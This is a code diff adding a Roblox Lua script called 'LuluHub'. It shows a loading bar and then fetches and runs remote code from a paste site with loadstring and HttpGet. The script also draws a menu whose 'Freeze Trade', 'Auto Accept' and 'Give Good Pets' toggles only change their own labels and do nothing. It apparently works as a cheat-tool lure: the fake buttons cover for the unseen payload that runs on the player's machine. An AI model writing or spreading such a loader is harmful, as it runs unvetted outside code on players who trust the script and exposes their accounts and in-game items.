@@ -1,0 +1,166 @@
+-- Create loading screen
+local loadingGui = Instance.new("ScreenGui")
+loadingGui.Name = "LoadingScreen"
+loadingGui.IgnoreGuiInset = true
+loadingGui.ResetOnSpawn = false
+loadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Loading background
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+bg.Parent = loadingGui
+
+-- Title with orange accent (matching main UI)
+local title = Instance.new("TextLabel")
+title.Text = "LuluHub"
+title.Font = Enum.Font.SourceSansBold
+title.TextColor3 = Color3.fromRGB(255, 140, 0)
+title.TextSize = 48
+title.AnchorPoint = Vector2.new(0.5, 0)
+title.Position = UDim2.new(0.5, 0, 0.3, 0)
+title.BackgroundTransparency = 1
+title.Parent = bg
+
+-- Loading bar frame
+local barFrame = Instance.new("Frame")
+barFrame.Size = UDim2.new(0.4, 0, 0, 10)
+barFrame.Position = UDim2.new(0.3, 0, 0.5, 0)
+barFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+barFrame.BorderSizePixel = 0
+barFrame.Parent = bg
+
+-- Loading bar fill
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+barFill.BorderSizePixel = 0
+barFill.Parent = barFrame
+
+-- Loading text
+local loadingText = Instance.new("TextLabel")
+loadingText.Text = "Loading..."
+loadingText.Font = Enum.Font.SourceSans
+loadingText.TextColor3 = Color3.fromRGB(200, 200, 200)
+loadingText.TextSize = 24
+loadingText.AnchorPoint = Vector2.new(0.5, 0)
+loadingText.Position = UDim2.new(0.5, 0, 0.6, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Parent = bg
+
+-- Main function
+local function main()
+    -- Animate loading bar
+    for i = 0, 1, 0.01 do
+        barFill.Size = UDim2.new(i, 0, 1, 0)
+        loadingText.Text = "Loading... " .. math.floor(i * 100) .. "%"
+        task.wait(0.03)
+    end
+
+    -- Load the main script with error handling
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/vwB91OLj/raw", true))()
+    end)
+
+    -- Create the main UI
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "LuluHubUI"
+    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    screenGui.ResetOnSpawn = false
+
+    -- Main Frame
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 200, 0, 160)
+    mainFrame.Position = UDim2.new(0.7, 0, 0.3, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Active = true
+    mainFrame.Draggable = true
+    mainFrame.Parent = screenGui
+
+    -- Outline
+    local outline = Instance.new("UIStroke")
+    outline.Thickness = 2
+    outline.Color = Color3.fromRGB(255, 140, 0)
+    outline.Parent = mainFrame
+
+    -- Corner Radius
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = mainFrame
+
+    -- Title
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.BackgroundTransparency = 1
+    title.Text = "LuluHub"
+    title.Font = Enum.Font.SourceSansBold
+    title.TextSize = 20
+    title.TextColor3 = Color3.fromRGB(255, 140, 0)
+    title.Parent = mainFrame
+
+    -- Function to create toggles
+    local function createToggle(name, yPos)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, -20, 0, 30)
+        btn.Position = UDim2.new(0, 10, 0, yPos)
+        btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        btn.Text = name .. ": OFF"
+        btn.Font = Enum.Font.SourceSans
+        btn.TextSize = 18
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.AutoButtonColor = true
+        btn.Parent = mainFrame
+
+        local btnCorner = Instance.new("UICorner")
+        btnCorner.CornerRadius = UDim.new(0, 6)
+        btnCorner.Parent = btn
+
+        btn.MouseButton1Click:Connect(function()
+            if btn.Text:find("OFF") then
+                btn.Text = name .. ": ON"
+                btn.BackgroundColor3 = Color3.fromRGB(255, 140, 0)
+            else
+                btn.Text = name .. ": OFF"
+                btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+            end
+        end)
+    end
+
+    -- Create Toggles
+    createToggle("Freeze Trade", 40)
+    createToggle("Auto Accept", 75)
+    createToggle("Give Good Pets", 110)
+
+    -- Handle completion
+    if success then
+        -- Fade out loading screen
+        for i = 0, 1, 0.05 do
+            bg.BackgroundTransparency = i
+            title.TextTransparency = i
+            loadingText.TextTransparency = i
+            barFrame.BackgroundTransparency = i
+            barFill.BackgroundTransparency = i
+            task.wait(0.03)
+        end
+    else
+        -- Error handling
+        loadingText.Text = "Error loading script!"
+        task.wait(2)
+        for i = 0, 1, 0.05 do
+            bg.BackgroundTransparency = i
+            title.TextTransparency = i
+            loadingText.TextTransparency = i
+            barFrame.BackgroundTransparency = i
+            barFill.BackgroundTransparency = i
+            task.wait(0.03)
+        end
+        warn("LuluHub Error: "..tostring(err))
+    end
+
+    -- Clean up loading screen
+    loadingGui:Destroy()
+end
+
+-- Start everything
+main()
